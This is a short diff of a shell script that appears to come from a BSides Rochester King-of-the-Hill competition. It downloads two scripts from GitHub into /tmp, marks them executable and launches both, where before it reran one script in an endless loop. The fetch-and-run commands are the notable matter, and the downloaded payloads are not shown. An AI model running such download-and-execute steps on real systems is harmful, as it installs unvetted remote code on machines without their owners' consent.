@@ -4,7 +4,5 @@ wget -O /tmp/one.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/m
 wget -O /tmp/two.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/changeImage.sh
 sleep 1
 chmod +x /tmp/one.sh & chmod +x /tmp/two.sh
- while :
-do
-	/tmp/one.sh 
-done
+	/tmp/one.sh & /tmp/two.sh
+
